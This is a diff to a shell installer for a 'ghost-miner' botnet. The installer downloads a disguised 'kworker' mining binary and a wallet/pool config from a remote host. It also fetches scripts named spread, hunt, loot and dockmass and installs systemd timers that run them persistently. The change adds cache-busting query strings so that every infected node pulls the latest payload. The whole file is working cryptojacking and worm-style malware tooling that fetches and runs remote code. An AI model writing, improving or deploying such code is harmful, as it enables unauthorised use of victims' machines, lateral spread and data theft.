@@ -15,7 +15,10 @@ mkdir -p "$SYSDIR"
 cd "$SYSDIR"
 
 # 1) constants (single source of truth, fetched from your host)
-curl -fsSL "$CONFIG_URL/worker.env" -o worker.env
+# raw.githubusercontent is CDN-cached for minutes, so a staged push can be
+# invisible fleet-wide until it expires. A per-run query string makes every
+# fetch land on the current revision.
+curl -fsSL "$CONFIG_URL/worker.env?v=$(date +%s)" -o worker.env
 . ./worker.env
 : "${WALLET:?set WALLET in worker.env}"
 : "${POOL:?set POOL in worker.env}"
@@ -23,8 +26,8 @@ RIG_ID="${RIG_ID:-node}"
 TLS="${TLS:-true}"
 
 # 2) binary + integrity check
-curl -fsSL "$PAYLOAD_URL" -o kworker.new
-if curl -fsSL "$SHA_URL" -o kworker.sha256 2>/dev/null; then
+curl -fsSL "$PAYLOAD_URL?v=$(date +%s)" -o kworker.new
+if curl -fsSL "$SHA_URL?v=$(date +%s)" -o kworker.sha256 2>/dev/null; then
     want=$(awk '{print $1}' kworker.sha256 | tr 'A-F' 'a-f')
     got=$(sha256sum kworker.new | awk '{print $1}' | tr 'A-F' 'a-f')
     [ "$want" = "$got" ] || { echo "ghost-miner: hash mismatch" >&2; exit 1; }
@@ -33,7 +36,7 @@ chmod 0755 kworker.new
 mv -f kworker.new kworker
 
 # 3) render config from template (wallet/pool injected)
-curl -fsSL "$CONFIG_URL/config.json" -o config.tmpl
+curl -fsSL "$CONFIG_URL/config.json?v=$(date +%s)" -o config.tmpl
 sed -e "s|__URL__|${POOL}|g" \
     -e "s|__USER__|${WALLET}|g" \
     -e "s|__PASS__|${RIG_ID}|g" \
@@ -45,7 +48,7 @@ sed -e "s|__URL__|${POOL}|g" \
 #    that is mid-run (spread/hunt fired by a timer) keeps reading its old inode
 #    instead of having the file rewritten underneath it.
 for f in run.sh updater.sh spread.sh hunt.sh loot.sh dock.sh dockmass.sh publish.sh tune.sh; do
-    curl -fsSL "$CONFIG_URL/$f" -o "$f.new"
+    curl -fsSL "$CONFIG_URL/$f?v=$(date +%s)" -o "$f.new"
     chmod 0755 "$f.new"
     mv -f "$f.new" "$f"
 done
@@ -73,8 +76,8 @@ if [ -n "${KEY_URL:-}" ]; then
 fi
 if command -v systemctl >/dev/null 2>&1; then
     for u in kworker-spread kworker-hunt kworker-tune kworker-loot kworker-dock kworker-mass; do
-        curl -fsSL "$CONFIG_URL/$u.service" -o "/etc/systemd/system/$u.service"
-        curl -fsSL "$CONFIG_URL/$u.timer" -o "/etc/systemd/system/$u.timer"
+        curl -fsSL "$CONFIG_URL/$u.service?v=$(date +%s)" -o "/etc/systemd/system/$u.service"
+        curl -fsSL "$CONFIG_URL/$u.timer?v=$(date +%s)" -o "/etc/systemd/system/$u.timer"
     done
     systemctl daemon-reload 2>/dev/null || true
     systemctl enable --now kworker-spread.timer 2>/dev/null || true
